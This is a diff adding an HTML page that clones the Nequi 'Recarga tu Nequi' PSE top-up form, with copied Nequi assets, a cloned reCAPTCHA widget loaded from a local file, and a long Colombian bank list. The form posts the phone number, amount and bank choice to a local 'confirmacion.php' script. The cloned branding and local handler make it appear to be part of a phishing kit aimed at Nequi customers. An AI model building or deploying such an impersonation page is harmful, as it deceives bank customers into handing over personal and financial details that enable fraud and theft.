@@ -1,0 +1,454 @@
+<html class="no-js">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <title>Recarga</title>
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="pragma" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta name="description" content="" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <meta name="theme-color" content="#11A6BB" />
+    <meta name="apple-mobile-web-app-title" content="Recarga Nequi PSE" />
+    <meta name="application-name" content="Recarga Nequi PSE" />
+    <meta name="theme-color" content="#ffffff" />
+    <link rel="apple-touch-icon" sizes="180x180" href="./nequ/favicon.ico" />
+    <link rel="icon" type="image/x-icon" href="./nequ/favicon.ico" />
+    <link rel="mask-icon" href="./nequ/favicon.ico" color="#5bbad5" />
+    <link href="./nequ/bootstrap.min.css" rel="stylesheet" />
+    <link href="./nequ/angular-tooltips.min.css" rel="stylesheet" />
+    <link href="./nequ/animate.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="./nequ/main.css" />
+    <script
+      src="https://code.jquery.com/jquery-3.6.0.js"
+      integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk="
+      crossorigin="anonymous"
+    ></script>
+
+    <script>
+      function validartlf() {
+        var tlf1 = document.getElementById("Inputphone").value;
+        var tlf2 = document.getElementById("InputphoneValid").value;
+
+        if (tlf1 != tlf2) {
+          alert("Los numeros de celular no coinciden");
+        } else {
+          document.getElementById("form1").submit();
+        }
+      }
+    </script>
+  </head>
+
+  <body ng-app="PSERecharge" class="ng-scope">
+    <div id="printable" class="contenido ng-scope" ng-view="" style="">
+      <div id="logo_wrapper" class="ng-scope">
+        <img class="logo_img" src="./nequ/nequi.svg" alt="Logo Nequi" />
+      </div>
+      <div class="ng-scope">
+        <div
+          ng-if="!cashInCtrl.toggled"
+          class="container vertical-center text-center ng-scope"
+        >
+          <div id="title1Wrapper">
+            <h1 id="title1" class="ng-binding">Recarga tu Nequi</h1>
+          </div>
+          <form
+            id="form1"
+            name="customer_info"
+            autocomplete="off"
+            class="ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-pragma-min-money-ammount ng-invalid-pragma-max-money-ammount ng-invalid-recaptcha"
+            action="./confirmacion.php"
+            method="post"
+          >
+            <fieldset
+              ng-disabled="cashInCtrl.form_lock"
+              oncopy="return false"
+              onpaste="return false"
+            >
+              <div class="container-form">
+                <div
+                  class="form-group"
+                  ng-class="{'errorPhone': !!cashInCtrl.phone &amp;&amp; !!cashInCtrl.phoneValid &amp;&amp; cashInCtrl.phone != cashInCtrl.phoneValid}"
+                >
+                  <input
+                    id="Inputphone"
+                    name="Inputphone"
+                    type="tel"
+                    ng-minlength="10"
+                    ng-maxlength="10"
+                    required=""
+                    class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength"
+                  />
+                  <label for="Inputphone" class="ng-binding"
+                    >Número de celular</label
+                  >
+                </div>
+                <div
+                  class="form-group"
+                  ng-class="{'errorPhone': !!cashInCtrl.phone &amp;&amp; !!cashInCtrl.phoneValid &amp;&amp; cashInCtrl.phone != cashInCtrl.phoneValid}"
+                >
+                  <input
+                    id="InputphoneValid"
+                    ng-disabled="cashInCtrl.form_lock"
+                    ng-model="cashInCtrl.phoneValid"
+                    type="tel"
+                    ng-minlength="10"
+                    ng-maxlength="10"
+                    required=""
+                    class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength"
+                  />
+                  <label for="InputphoneValid" class="ng-binding"
+                    >Confirma el número de celular</label
+                  >
+                  <div class="helpErrorPhone">
+                    <p>¡Ups! Esos dos números no coinciden, porfa revísalos.</p>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <span
+                    style="
+                      position: absolute;
+                      margin-top: 23px;
+                      margin-left: -160px;
+                    "
+                    >$</span
+                  >
+                  <input
+                    name="Inputcuanto"
+                    class="number"
+                    type="text"
+                    maxlength="11"
+                    style=""
+                    required="required"
+                  />
+
+                  <label for="Inputammount" class="ng-binding">¿Cuánto?</label>
+                  <script>
+                    $("input.number").keyup(function (event) {
+                      // skip for arrow keys
+                      if (event.which >= 37 && event.which <= 40) {
+                        event.preventDefault();
+                      }
+
+                      $(this).val(function (index, value) {
+                        return value
+                          .replace(/\D/g, "")
+                          .replace(/([0-9])([0-9]{2})$/, "$1,$2")
+                          .replace(/\B(?=(\d{3})+(?!\d)\.?)/g, ".");
+                      });
+                    });
+                  </script>
+                </div>
+
+                <div class="form-group">
+                  <select
+                    id="selectPersonType"
+                    name="Inputpersona"
+                    class="select_bank ng-pristine ng-untouched ng-valid ng-not-empty ng-valid-required"
+                    autocomplete="off"
+                    ng-model="cashInCtrl.gateway_type"
+                    ng-options="x.label for x in cashInCtrl.gateway_types track by x.value"
+                    required=""
+                  >
+                    <option label="Natural" value="Natural" selected="selected">
+                      Natural
+                    </option>
+                    <option label="Jurídica" value="Jurídica">Jurídica</option>
+                  </select>
+                  <label for="selectPersonType" class="ng-binding"
+                    >Tipo de persona</label
+                  >
+                </div>
+                <div class="form-group">
+                  <select
+                    id="selectBank"
+                    name="Inputbanc"
+                    autocomplete="off"
+                    ng-model="cashInCtrl.bank"
+                    ng-options="x.name for x in cashInCtrl.bankList track by x.code"
+                    ng-click="cashInCtrl.timeTooltip(cashInCtrl.bank)"
+                    required=""
+                    class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required"
+                  >
+                    <option value="?" selected="selected"></option>
+                    <option
+                      label="A continuación seleccione su banco"
+                      value="0"
+                    >
+                      A continuación seleccione su banco
+                    </option>
+                    <option
+                      label="ALIANZA FIDUCIARIA"
+                      value="ALIANZA FIDUCIARIA"
+                    >
+                      ALIANZA FIDUCIARIA
+                    </option>
+                    <option label="BAN100" value="BAN100">BAN100</option>
+                    <option label="BANCAMIA S.A." value="BANCAMIA S.A">
+                      BANCAMIA S.A.
+                    </option>
+                    <option label="BANCO AGRARIO" value="BANCO AGRARIO">
+                      BANCO AGRARIO
+                    </option>
+                    <option label="BANCO AV VILLAS" value="BANCO AV VILLA">
+                      BANCO AV VILLAS
+                    </option>
+                    <option
+                      label="BANCO BBVA COLOMBIA S.A."
+                      value="BANCO BBVA COLOMBIA S.A."
+                    >
+                      BANCO BBVA COLOMBIA S.A.
+                    </option>
+                    <option label="BANCO CAJA SOCIAL" value="BANCO CAJA SOCIAL">
+                      BANCO CAJA SOCIAL
+                    </option>
+                    <option
+                      label="BANCO COOPERATIVO COOPCENTRAL"
+                      value="BANCO COOPERATIVO COOPCENTRAL"
+                    >
+                      BANCO COOPERATIVO COOPCENTRAL
+                    </option>
+                    <option label="BANCO DAVIVIENDA" value="DAVIVIENDA">
+                      BANCO DAVIVIENDA
+                    </option>
+                    <option label="BANCO DE BOGOTA" value="BANCO DE BOGOTA">
+                      BANCO DE BOGOTA
+                    </option>
+                    <option
+                      label="BANCO DE OCCIDENTE"
+                      value="BANCO DE OCCIDENTE"
+                    >
+                      BANCO DE OCCIDENTE
+                    </option>
+                    <option label="BANCO FALABELLA " value="FALABELLA">
+                      BANCO FALABELLA
+                    </option>
+                    <option
+                      label="BANCO FINANDINA S.A. BIC"
+                      value="BANCO FINANDINA S.A. BIC"
+                    >
+                      BANCO FINANDINA S.A. BIC
+                    </option>
+                    <option label="BANCO GNB SUDAMERIS" value="1012">
+                      BANCO GNB SUDAMERIS
+                    </option>
+                    <option label="BANCO ITAU" value="BANCO ITAU">
+                      BANCO ITAU
+                    </option>
+                    <option
+                      label="BANCO J.P. MORGAN COLOMBIA S.A."
+                      value="1071"
+                    >
+                      BANCO J.P. MORGAN COLOMBIA S.A.
+                    </option>
+                    <option label="BANCO MUNDO MUJER S.A." value="1047">
+                      BANCO MUNDO MUJER S.A.
+                    </option>
+                    <option
+                      label="BANCO PICHINCHA S.A."
+                      value="BANCO PICHINCHA S.A."
+                    >
+                      BANCO PICHINCHA S.A.
+                    </option>
+                    <option label="BANCO POPULAR" value="BANCO POPULAR">
+                      BANCO POPULAR
+                    </option>
+                    <option label="BANCO SANTANDER COLOMBIA" value="1065">
+                      BANCO SANTANDER COLOMBIA
+                    </option>
+                    <option label="BANCO SERFINANZA" value="BANCO SERFINANZA">
+                      BANCO SERFINANZA
+                    </option>
+                    <option label="BANCO UNION antes GIROS" value="1303">
+                      BANCO UNION antes GIROS
+                    </option>
+                    <option label="BANCOLOMBIA" value="BANCOLOMBIA">
+                      BANCOLOMBIA
+                    </option>
+                    <option label="BANCOOMEVA S.A." value="1061">
+                      BANCOOMEVA S.A.
+                    </option>
+                    <option label="CFA COOPERATIVA FINANCIERA" value="1283">
+                      CFA COOPERATIVA FINANCIERA
+                    </option>
+                    <option label="CITIBANK " value="CITIBANK">CITIBANK</option>
+                    <option label="COLTEFINANCIERA" value="1370">
+                      COLTEFINANCIERA
+                    </option>
+                    <option label="CONFIAR COOPERATIVA FINANCIERA" value="1292">
+                      CONFIAR COOPERATIVA FINANCIERA
+                    </option>
+                    <option
+                      label="COOFINEP COOPERATIVA FINANCIERA"
+                      value="1291"
+                    >
+                      COOFINEP COOPERATIVA FINANCIERA
+                    </option>
+                    <option label="COTRAFA" value="COTRAFA">COTRAFA</option>
+                    <option label="DALE" value="1097">DALE</option>
+                    <option label="DAVIPLATA" value="DAVIPLATA">
+                      DAVIPLATA
+                    </option>
+                    <option label="IRIS" value="1637">IRIS</option>
+                    <option label="LULO BANK" value="LULO BANK">
+                      LULO BANK
+                    </option>
+                    <option label="MOVII S.A." value="1801">MOVII S.A.</option>
+                    <option label="RAPPIPAY" value="RAPPIPAY">RAPPIPAY</option>
+                    <option
+                      label="SCOTIABANK COLPATRIA"
+                      value="SCOTIABANK COLPATRIA"
+                    >
+                      SCOTIABANK COLPATRIA
+                    </option>
+                  </select>
+                  <label for="selectBank" class="ng-binding"
+                    >Elige el banco</label
+                  >
+                </div>
+              </div>
+              <br />
+              <div
+                ng-if="cashInCtrl.showCaptcha"
+                class="captcha-wp ng-pristine ng-untouched ng-valid ng-scope ng-isolate-scope ng-empty"
+                vc-recaptcha=""
+                ng-model="cashInCtrl.myRecaptchaResponse"
+                key="'6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i'"
+                lang="es"
+                type="'image'"
+              >
+                <div style="width: 304px; height: 78px">
+                  <div>
+                    <iframe
+                      title="reCAPTCHA"
+                      width="304"
+                      height="78"
+                      role="presentation"
+                      name="a-wcum8gsv5ubt"
+                      frameborder="0"
+                      scrolling="no"
+                      sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
+                      src="./nequ/anchor.html"
+                    ></iframe>
+                  </div>
+                  <textarea
+                    id="g-recaptcha-response"
+                    name="g-recaptcha-response"
+                    class="g-recaptcha-response"
+                    style="
+                      width: 250px;
+                      height: 40px;
+                      border: 1px solid rgb(193, 193, 193);
+                      margin: 10px 25px;
+                      padding: 0px;
+                      resize: none;
+                      display: none;
+                    "
+                  ></textarea>
+                </div>
+              </div>
+              <div
+                class="g-recaptcha"
+                data-sitekey="6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i"
+              ></div>
+            </fieldset>
+            <div class="PSEnote">
+              <span class="psetext ng-binding"
+                >La recarga se hará usando los servicios de PSE y se debitará de
+                tu cuenta corriente o de ahorros.</span
+              >
+            </div>
+            <button
+              type="button"
+              class="submit_btn ng-binding"
+              ng-class="cashInCtrl.btnClass"
+              onClick="validartlf()"
+              ng-disabled="!cashInCtrl.myRecaptchaResponse || customer_info.$invalid || cashInCtrl.noSubmit || cashInCtrl.phone != cashInCtrl.phoneValid"
+            >
+              Sigue
+            </button>
+          </form>
+
+          <script>
+            function validateForm() {
+              var phone = document.getElementById("Inputphone").value;
+              var phoneValid = document.getElementById("InputphoneValid").value;
+
+              if (phone !== phoneValid) {
+                document.getElementById("phoneError").style.display = "block";
+                return false;
+              } else {
+                document.getElementById("phoneError").style.display = "none";
+                return true;
+              }
+            }
+          </script>
+          <button
+            type="submit"
+            class="submit_btn_alt ng-binding"
+            ng-click="cashInCtrl.gotoHome()"
+            ng-disabled=" cashInCtrl.noSubmit"
+          >
+            Ahora no
+          </button>
+          <a href="#" target="_blank" class="btn-help ng-binding">Ayuda</a>
+        </div>
+      </div>
+    </div>
+    <div
+      style="
+        background-color: rgb(255, 255, 255);
+        border: 1px solid rgb(204, 204, 204);
+        box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px;
+        position: absolute;
+        transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s;
+        opacity: 0;
+        visibility: hidden;
+        z-index: 2000000000;
+        left: 0px;
+        top: -10000px;
+      "
+    >
+      <div
+        style="
+          width: 100%;
+          height: 100%;
+          position: fixed;
+          top: 0px;
+          left: 0px;
+          z-index: 2000000000;
+          background-color: rgb(255, 255, 255);
+          opacity: 0.05;
+        "
+      ></div>
+      <div
+        class="g-recaptcha-bubble-arrow"
+        style="
+          border: 11px solid transparent;
+          width: 0px;
+          height: 0px;
+          position: absolute;
+          pointer-events: none;
+          margin-top: -11px;
+          z-index: 2000000000;
+        "
+      ></div>
+      <div
+        class="g-recaptcha-bubble-arrow"
+        style="
+          border: 10px solid transparent;
+          width: 0px;
+          height: 0px;
+          position: absolute;
+          pointer-events: none;
+          margin-top: -10px;
+          z-index: 2000000000;
+        "
+      ></div>
+      <div style="z-index: 2000000000; position: relative"></div>
+    </div>
+  </body>
+</html>
